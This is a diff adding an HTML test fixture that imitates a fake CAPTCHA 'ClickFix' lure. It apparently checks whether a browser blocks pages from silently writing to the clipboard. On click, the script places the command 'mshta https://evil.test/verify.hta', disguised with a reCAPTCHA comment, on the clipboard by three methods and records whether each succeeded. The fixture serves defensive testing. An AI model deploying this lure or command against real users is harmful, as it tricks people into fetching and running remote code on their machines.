@@ -1,0 +1,21 @@
+<!doctype html><meta charset="utf-8"><title>Fake CAPTCHA (ClickFix)</title>
+<body><h1>Verify you are human</h1>
+<button id="go">I am not a robot</button>
+<script>
+// Adversarial fixture: on a user click, writes a malicious command to the clipboard three ways.
+const cmd = 'mshta https://evil.test/verify.hta # I am not a robot - reCAPTCHA Verification ID: 4821';
+const r = (window.__result = {});
+document.getElementById('go').addEventListener('click', async () => {
+  await navigator.clipboard.writeText('sentinel');                     // benign write sets the baseline
+  r.writeText = await navigator.clipboard.writeText(cmd).then(() => 'ok', e => 'rejected:' + e.name);
+  const ta = document.createElement('textarea'); ta.value = cmd; document.body.appendChild(ta);
+  ta.focus(); ta.select();
+  r.execCommand = document.execCommand('copy');                         // expect false when blocked
+  ta.remove();
+  document.addEventListener('copy', e => { e.clipboardData.setData('text/plain', cmd); e.preventDefault(); });
+  r.copyEvent = document.execCommand('copy');                           // handler-supplied payload
+  r.clipboard = await navigator.clipboard.readText().catch(e => 'readfail:' + e.name);
+  r.leaked = r.clipboard.includes('mshta');
+  window.__done = true;
+});
+</script>
